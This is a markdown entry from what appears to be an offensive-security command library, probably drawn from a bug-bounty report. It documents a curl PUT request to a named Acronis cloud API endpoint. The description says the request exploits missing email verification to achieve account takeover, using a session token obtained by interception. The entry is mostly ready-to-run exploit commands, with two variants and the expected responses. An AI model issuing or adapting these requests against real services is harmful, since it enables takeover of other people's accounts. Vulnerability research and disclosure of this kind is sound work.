---
id: modify-account-email-put
data: >-
  curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account -H
  "Content-Type: application/json" -H "Authorization: Bearer <session-token>" -d
  '{"name":"Staff Member","email":"0xcrypto+staffmember1@wearehackerone.com"}'
tags:
  - api
  - http-put
  - account-mod
type: command
output: HTTP/1.1 204 No Content
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:12.061Z'
verified: false
validated: true
submitted: true
---
# modify-account-email-put

## Command

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <session-token>" \
  -d '{"name":"Staff Member","email":"0xcrypto+staffmember1@wearehackerone.com"}'
```

## Description

This command sends a PUT request to update the account name and email in Acronis File Sync & Share, exploiting the lack of verification to change to an unverified email for takeover. Use after intercepting the original request to obtain the session token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method for updating the account | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format | Yes |
| `-H "Authorization: Bearer <session-token>"` | Provides the authentication token from the session | Yes |
| `-d '{...}'` | JSON payload with name and email updates | Yes |
| `name` | Display name to set | No |
| `email` | Target email address (must be unverified) | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." \
  -d '{"name":"Staff Member","email":"target@unverified.com"}'
```

### Advanced Usage

Include additional headers if needed for the session:

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"name":"Updated Name","email":"new@email.com"}'
```

## Expected Output

Successful execution returns HTTP 204 No Content, indicating the email change was applied. If the email is already verified/taken, expect a 400 or 409 error with a message about the email being in use.

## Related

- [[commands/target-unverified-email-json]]
- [[procedures/Intercept-and-Modify-Email-Change-Request]]
